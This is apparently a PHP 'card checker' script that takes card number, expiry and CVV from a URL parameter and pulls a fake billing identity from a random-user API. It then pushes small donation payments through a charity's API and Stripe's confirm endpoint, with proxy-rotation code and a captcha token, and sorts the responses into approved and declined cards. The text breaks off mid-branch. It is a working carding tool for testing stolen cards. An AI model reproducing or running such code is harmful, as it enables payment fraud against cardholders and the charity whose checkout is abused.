<?php

$execution_time_limit = 3600;
set_time_limit($execution_time_limit);
error_reporting(0);
date_default_timezone_set('America/New_York');

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function rebootproxys()
{
    $proxySocks4 = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxySocks4) - 1);
    $proxySocks = $proxySocks4[$myproxy];
    return $proxySocks;
}

$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

if (file_exists(getcwd() . '/cookie.txt')) {
    @unlink('cookie.txt');
}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

$states = array(
    "Alabama" => "AL", "Alaska" => "AK", "Arizona" => "AZ", "California" => "CA",
    "Colorado" => "CO", "Connecticut" => "CT", "Delaware" => "DE", "District of Columbia" => "DC",
    "Florida" => "FL", "Georgia" => "GA", "Hawaii" => "HI", "Idaho" => "ID",
    "Illinois" => "IL", "Indiana" => "IN", "Iowa" => "IA", "Kansas" => "KS",
    "Kentucky" => "KY", "Louisiana" => "LA", "Maine" => "ME", "Maryland" => "MD",
    "Massachusetts" => "MA", "Michigan" => "MI", "Minnesota" => "MN", "Mississippi" => "MS",
    "Missouri" => "MO", "Montana" => "MT", "Nebraska" => "NE", "Nevada" => "NV",
    "New Hampshire" => "NH", "New Jersey" => "NJ", "New Mexico" => "NM", "New York" => "NY",
    "North Carolina" => "NC", "North Dakota" => "ND", "Ohio" => "OH", "Oklahoma" => "OK",
    "Oregon" => "OR", "Pennsylvania" => "PA", "Rhode Island" => "RI", "South Carolina" => "SC",
    "South Dakota" => "SD", "Tennessee" => "TN", "Texas" => "TX", "Utah" => "UT",
    "Vermont" => "VT", "Virginia" => "VA", "Washington" => "WA", "West Virginia" => "WV",
    "Wisconsin" => "WI", "Wyoming" => "WY"
);

$state = isset($states[$state]) ? $states[$state] : "KY";

/////////////////==============[Init Proxy Section]===============//////////////////////////////
/////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
// $Websharegay = rand(0,250);
// $rp1 = array(
//   1 => 'lufnjuxw-rotate:6zl7p5dokjpo',
//     ); 
//     $rotate = $rp1[array_rand($rp1)];
// //////////////////////////==============[Proxy Section]===============//////////////////////////////
// $ch = curl_init('https://api.ipify.org/');
// curl_setopt_array($ch, [
// CURLOPT_RETURNTRANSFER => true,
// CURLOPT_PROXY => 'p.webshare.io:80',
// CURLOPT_PROXYUSERPWD => $rotate,
// CURLOPT_HTTPGET => true,
// ]);
// $ip1 = curl_exec($ch);
// curl_close($ch);
// ob_flush();  
// if (isset($ip1)){
// $ip = "Live! ✅";
// }
// if (empty($ip1)){
// $ip = "Dead!❌";
// }
// echo '[ IP: '.$ip.' ] ';
// ///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
// ////////////////////////////===[2ST CURL]
// ///$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80"); 
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
// /////////========Luminati
// ////////=========Socks Proxy
// curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);

$ch = curl_init
('https://api.givesome.gives/api/payment/paymentIntent');

// build json body first
$postBody = json_encode([
  "mode" => "payment",
  "amount" => 2.3,
  "givesomeTip" => 0.3,
  "currency" => "cad",
  "description" => "Payment For Givesome Donation (to Transit)",
  "paymentMethodId" => [],
  "userId" => null
]);

curl_setopt_array($ch, [
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'php-curl',
  CURLOPT_HEADER => false,
  CURLOPT_HTTPHEADER => [
    'Accept: application/json, text/plain, */*',
    'Content-Type: application/json',
    'Origin: https://givesome.org',
    'Referer: https://givesome.org/',
    // you do NOT need Content-Length, method, path, authority pseudo-headers
  ],
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_POST => true,
  CURLOPT_SSL_VERIFYPEER => false, // disable only for local testing
  CURLOPT_SSL_VERIFYHOST => 0,
  CURLOPT_COOKIEFILE => getcwd() . '/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd() . '/cookie.txt',
  CURLOPT_POSTFIELDS => $postBody,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1 // force HTTP/1.1 to avoid PROTOCOL_ERROR
]);

$result1 = curl_exec($ch);

if (curl_errno($ch)) {
  echo 'cURL error: ' . curl_error($ch);
}
curl_close($ch);

// Debug: uncomment if you want raw response
///echo "Response: " . $result1;

$response_data = json_decode($result1, true);
if (json_last_error() === JSON_ERROR_NONE) {
  $token11 = $response_data['data']['clientSecret'] ?? 'Not Found';
  $token12 = $response_data['data']['paymentIntentId'] ?? 'Not Found';
  // echo "clientSecret: " . $token11 . "\n";
  // echo "paymentIntentId: " . $token12. "\n";
} else {
  echo "Invalid JSON response\n";
}


//request 2

$ch = curl_init();

// Set the URL you want to fetch
$url = "https://api.givesome.gives/api/payment/paymentIntent/update";

// Set the cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: application/json, text/plain, */*',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: application/json',
    'Origin: https://givesome.org',
    'Referer: https://givesome.org/',
    'Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'Sec-Ch-Ua-Mobile: ?0',
    'Sec-Ch-Ua-Platform: "Windows"',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
));

// Force HTTP/1.1
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

// Set the POST fields
// $token12 = "your_token_here"; // replace this with the actual token
$postFields = json_encode([
    "paymentIntentId" => $token12,
    "isSaveCardDetails" => false,
    "userId" => null
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);

// Set the Content-Type header to application/json
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($postFields)
]);

// Execute the cURL session and get the response
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
    echo 'cURL error: ' . curl_error($ch);
} else {
    // Print the response
    ///echo $response;
}

// Close the cURL session
curl_close($ch);

// request 3
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$token12.'/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com'.
'method: POST'.
'path: /v1/payment_intents/'.$token12.'/confirm'.
'scheme: https'.
'accept: application/json'.
'accept-encoding: gzip, deflate, br'.
'accept-language: en-US,en;q=0.9'.
'content-length: 4000'.
'content-type: application/x-www-form-urlencoded'.
'origin: https://js.stripe.com'.
'referer: https://js.stripe.com/'.
'sec-fetch-dest: empty'.
'sec-fetch-mode: cors'.
'sec-fetch-site: same-site'.
'sec-gpc: 1'.
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'4&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[allow_redisplay]=unspecified&payment_method_data[billing_details][address][country]=IN&payment_method_data[payment_user_agent]=stripe.js%2F882aee1fe0%3B+stripe-js-v3%2F882aee1fe0%3B+payment-element&payment_method_data[referrer]=https%3A%2F%2Fgivesome.org&payment_method_data[time_on_page]=82796&payment_method_data[client_attribution_metadata][client_session_id]=db47206b-b62a-4f78-ae48-545497c49b2d&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=standard&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=automatic&payment_method_data[client_attribution_metadata][elements_session_config_id]=a069e1c3-5381-4019-a950-6b145075f137&payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]=payment&payment_method_data[guid]=2bfc0940-71df-4a4c-a59d-eca6e515580f8d2293&payment_method_data[muid]=fb80ff14-18bf-4bab-8a3a-60683fa8e43434e065&payment_method_data[sid]=bc96614e-a265-4210-aefe-f90d90152314a4d5bc&expected_payment_method_type=card&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY3NzcyNjA4LCJjZGF0YSI6ImFJcHpRUDE3VkdGYVVVa2RlUzIrdnN6di9KMExESWhOOG85R09jSElHNmQ4NmExdHB3NVkyWVl3NXYxUEVtL0xTdmdPV0REUXBHQ2Z3OGU0dVhzaDhKUkdxdkNmMnZHOWtDMVpkRVVFeDJzdm1hb1B0YjdtMlNWNDJ3Y3hUT0xyTXRzcmFZQzN6dEtZaHdoM05WL2crRXZVZGlFV0JRMzhHQzJFY0h2L2s3MjRZUVp2eTg5VE00ZVdSWFBZekErbUg1STBhZTVpa0l3NEdiaUsiLCJwYXNza2V5IjoicVRubkh0L3RFSXZsZTJuMzI4ZkZkYmM1b2s2aXNCbkdmRFZFWWd5VERndndmRUEyQldFQVpKemRVeWZ3aitka3lYQm1XcEdobWtlNmtGUVJJNzN2aFFEVDZwL2wycEhxTGUvZlp2ME80NlUrYnNFZ2VlQVBCWlJtbmZ6UE1na2pERHVSNG5iYnAzeGJ3YXEyYmIvNDlXOVJ5bGxhMVpuVjVDSTZIZXZWZ0xUQllidXBycUJNR1F2bjhVRWNFNFYwUmF3TTBITndjSEV5THVuZnNFT2N1SHIycUdrRzdVbnN0cXFUYlRqSVIvRWIyUUVlcENUazV1aTV1MC9BME1hdk9TcnBnUXhuanlnVkJaZm9TVEp4ZmIwekpzbCtER2wrakZ3dFZsQ3Q5S0oxYUFSTUJTM0YxWmZCK1FXOU5HNjhZWHhjLzlJeUgzUkFXeWYrRjdqYnRtVDE2cHVYTlZhY3Q3Wk0yS1J1Wk1qY2I1cHFPZG5LdEpNUW9YWkNHRWdIdk56dGlmalFKN0dxbTBRaXg3cG9TNW85aWRnblUrdGgva1M2anJob0h0T1lYU2FUSEs1azNsSmZTc3JLU0hTMW1oTFd5TDNYcTNnVjN0dDExQTZVT3F6ak5teGxkZDNSL1F1em9FUkNGRWE0b1hXb2NBQmFFSGszeXRGcXN2aEZyN1h3amlCQUkwWVJSRzJpdnFsVTRUWmhXY2s2Ri8zS0NmTVpEUm5LQWRmSW5GRUpneEVPQURuRWlzUGZJM2hIdjhsbVpEY1NhUFM0TWRnVFZlQWptUnNBWUt1VmlqdTNsa1RuS3pnOFBSWEFSYzhETVJJYVlkTjlXcGQ0NnF0RjU3VEY2TjloZUlKRWVnWXhHYzNXaVp2ZzNZSjEraW96eGR1dHBrRkRKamcvSFpmV1ltZER4TnpxdHhqUFNSZ1VqdFFjSmFlMnhGc1libW5aVkpTU0x4SXRhWGFKZWZzWTdRMGc4WEVZSjFxZ1F0eWhTeE1kOUJJd3FzRTNlTEZjWVVkVXI2RkU1UTVIVWhXakZFV1AvOUMwRnZJSzVhRngrMmM3Mmh1MGk1RkhtRkExa1hsYTZkUzN5TjN6K2Y5Z3VrU3RZdnVZZUFSZCsxMVdmMWJPekJDUEpicDl6K0I5eG82VGJpOWtBenkzaTI2TkFlblF2S3FENEtxTE05QTdqenBtSERQT0dJVElEL2xNcmJtQnVpMmFrTzNrdW5jTVZnZjFJNnhlQmdWbmlpYjhCOVFFNDdDeFVRM1hCbmRaRVNqRjFFOGpyV0lnTzM0bHZjNitzNGs5UWRTV0VIOXNJWnhhdzlxMWFFM25MV3RIYnppeHMzZTRyMHpLaVYwTi9saVRFMWc0UWpseUY4K05QQkR3ekhuSkNkVGZDSXlMQkJzTzNjaHNNL21YMmswOUJ2UU1HTHBiM0NJSVJsYUFGYWx1aEZHVkxzVjY4bGpUZnVyVGNwdjVtV2FEU3pGMmhaMnZXZEkwQ3V6UzFjTDE3bnpqZllOaVNnRGtoeXdzNWlNbFM2RlNQV09YZmt1bGRsOVczLzVKcjluQ2Z6aThMd1VRUHg3U3ZPZnEvRzNxNDdKUmhXNkpCVng2c3o3WWh2STBPVWtKSGFjc0ZEdWxUbzc3WEJOWm90K2RMbUJZWmV4bktPalJ0YmdnQ2M0TDkwSUkxaFZHdHo1WWFvbXdGR09ETjhEVnE0MEVTU3I5OGNrbzZyUmI3UmF1VEJzYklWMGkrWHIrRTlpL05IbHRVS2E4OGZ0WWtOMGdrZjRoeHowU2lPd1ZLaHNONDExOWlkWkRCN25RRENaUHVCcXR4N0lNTG9zU0tTQTZ3RlNGZmlaVjJyMHVsMmRaejJuNlRjYlVOVDEyRldYYWlNTlUyR2gzcWJQTndmZmFoRFFJVGtqWnlKa1VRNFdzQ0pvK1RIaWtWVDBFV0cwUUUxSWdEK3pVc1N5YUVHZjNGSHNKNC8rNWFZYStPY0QwL0JJRkZZWDQyNHVLRmx6RndkTFIwdGVQZko1U2o0QUI3cGdSU3hVRkVYZWptVTcrdytzK0Fhc0JZcXR0SlVoTkErbUEvWkYvaE5wNGRkZVVwVU1wT2ZZTmVpYmhwRG1FaWp4OWpGUCs0b2lvZDhBRW1EN2ZraWxMQkJ1dWIzR3hNWE5teGVNZU5DcjBad0prRWxiMWNuZkJrcTJsbzhTcStOUzZGNlkvSTkwdXlieTRtMmZYelJmcmdUVEZ0NUttcmZKWGlwYXdTRlRRYlBKc2pXWkJZYUllTC9yaHNpV2RjQXp6eXI3Mm10cFNyME04dWdiWFBDbWQ2SWhsY1VtQzdJaE05OHJQdDZLRjBua0h0QjFheG41OTJFM2JlRERqSWt4OWFNSmRkdFpJR0JSUnNQMTBVYlB2aHNOWWc2c1lUZnRXditsRWk1alg0UVhWOUJ4eFBXdVR3cEZUWlRObUc1Z1d6Z0pYNmpvWDhYajN3V1lCd0IyR0xHcEJ1RGJWZ3QxaTB5djU2M1dTaG9DYW9yamQ4VzQzWUdTTFVlendjZDhOVHJPeXVXanFwUXRrSGVuaUcyc0cxdHhHOEQ5MUFZTG50NW40d0VEVHB3OXJVWUdCbTNNPSIsImtyIjoiM2UyZmJkOTUiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.TK1mm0rLwbDE927WRglB5ySxXVtBpdeenrS2g3FiVew&use_stripe_sdk=true&key=pk_live_AQLxo4SlqpcVyBZnpOXJ2g5V&client_attribution_metadata[client_session_id]=db47206b-b62a-4f78-ae48-545497c49b2d&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=standard&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=a069e1c3-5381-4019-a950-6b145075f137&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_secret='.$token11.'');


$result = curl_exec($ch);



////////////////////////////===[Card Response]

if(strpos($result, '"cvc_check": "pass"')){
	
	///if(strpos($result, 'requires_capture')){

  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i></font><br> </i> </font><br>";

  }
  elseif(strpos($result, "Thank You For Donation." )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "requires_capture")) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>PREAUTH SUCESS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>SUCCESS CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CHARGED 2$</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "-----BEGIN CERTIFICATE-----" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>CCN</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'fraudulent')) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CCN1</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>LOST CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>STOLEN CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font size=3 color='black'><font class='badge badge-light'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INCORRECT</i></font><br> <font class='badge badge-light'";
  }
  elseif(strpos($result, "incorrect_cvc" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INCORRECT</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "invalid_cvc" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INVALID</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>STOLEN OR LOST</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has expired.' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, 'invalid_expiry_month' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INVALID MONTH</i> </font><br>";
  }
  elseif(strpos($result, 'invalid_expiry_year' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INVALID YEAR</i> </font><br>";
  }
  elseif(strpos($result, 'Unrecognized request URL (POST: /v1/payment_intents//confirm). If you are trying to list objects, remove the trailing slash. If you are trying to retrieve an object, make sure you passed a valid (non-empty) identifier in your code. Please see https://stripe.com/docs or we can help at https://support.stripe.com/."' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>ERROR IN GATEWAY</i> </font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas  <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i> </font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>DO NOT HONOR</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result, '"Server Error"')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>SERVER ERROR</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas  <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CVC_CHECKED : Fail</i> </font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING CARD DETAIL</i> </font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT CHECK</i> </font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>VBV</i> </font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>3D SECURED</i> </font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i> </font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i> </font><br>";
}
elseif(strpos($result, "MISSING CARD DETAIL")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING DETAILS</i> </font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
elseif(strpos($result, 'verification_url')) {
